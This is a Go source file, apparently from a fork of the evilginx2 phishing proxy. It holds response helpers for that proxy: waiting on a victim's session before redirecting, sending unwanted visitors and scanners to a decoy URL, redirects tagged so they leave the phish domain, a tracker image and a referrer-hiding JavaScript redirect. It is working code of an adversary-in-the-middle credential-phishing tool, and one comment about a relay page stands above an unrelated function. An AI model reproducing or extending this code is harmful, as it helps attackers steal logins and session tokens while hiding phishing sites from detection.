// evilginx2-extended (fork): request-block / decoy / redirect response helpers.
package core

import (
	"fmt"
	"net/http"
	"time"

	"github.com/elazarl/goproxy"
)

func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {

	s, ok := p.sessions[session_id]
	if ok {

		if s.IsDone {
			return s.RedirectURL, true
		}

		ticker := time.NewTicker(30 * time.Second)
		select {
		case <-ticker.C:
			break
		case <-s.DoneSignal:
			return s.RedirectURL, true
		}
	}
	return "", false
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	var redirect_url string
	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
	}
	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
		redirect_url = p.cfg.general.UnauthUrl
	}

	if redirect_url != "" {
		return p.javascriptRedirect(req, redirect_url)
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

// relayPage serves the relay's root page for a RELAY LURE hit — the URL bar
// keeps the lure path (nice, token-gated), only the XHRs go to /__relay/api.

func (p *HttpProxy) blockRedirect(req *http.Request, target string) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
	if resp != nil {
		// marker: OnResponse must not rewrite this Location back onto the
		// phish domain — the redirect exists to LEAVE it
		resp.Header.Set("X-Eg-Gate", "1")
		resp.Header.Set("Location", target)
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
	if mime == "" {
		mime = "text/plain"
	}
	resp := goproxy.NewResponse(req, mime, http_status, body)
	if resp != nil {
		origin := req.Header.Get("Origin")
		if origin != "" {
			resp.Header.Set("Access-Control-Allow-Origin", origin)
		}
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		return req, resp
	}
	return req, nil
}
